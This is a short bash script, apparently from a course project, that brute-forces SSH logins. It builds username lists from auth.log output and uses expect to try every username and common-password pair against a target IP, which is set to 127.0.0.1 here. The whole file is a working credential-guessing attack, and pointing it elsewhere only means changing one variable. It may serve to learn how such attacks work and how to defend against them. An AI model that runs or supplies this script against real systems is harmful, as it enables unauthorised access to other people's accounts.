#!/bin/bash

#
# Using the project1 auth.log search script, I took that output and ran these awk lines
# awk '{ if ($8 !~ "invalid") print $8; else print $10; }' project1_output > duplicates
# awk'!_[$1]++' duplicates > commonusers.txt
#

namelist="commonusers.txt"
passlist="commonpasses.txt"
num1=`wc -l $namelist | awk '{print $1}'`
num2=`wc -l $passlist | awk '{print $1}'`
IP="127.0.0.1"

echo "Total number of pass/user combinations are $(($num1*$num2))"
echo "Continue? [Yy] "
read input

if [[ ${input} = "Y" || ${input} = "y" ]]
then
	while read -r name; do
		while read -r pass; do
			echo "#----------------------#"
			echo "Trying name: $name and pass: $pass"
			#removed    set timeout 1
			expect -c "
   				spawn ssh $name@$IP
   				expect password: { send $pass\r }	
				expect .* {}
   				exit
			"
			echo ''
			echo "#----------------------#"
			echo ''
		done < ${passlist}
	done < ${namelist}
	echo "Brute force completed"
else
	echo "Exiting..." 
fi
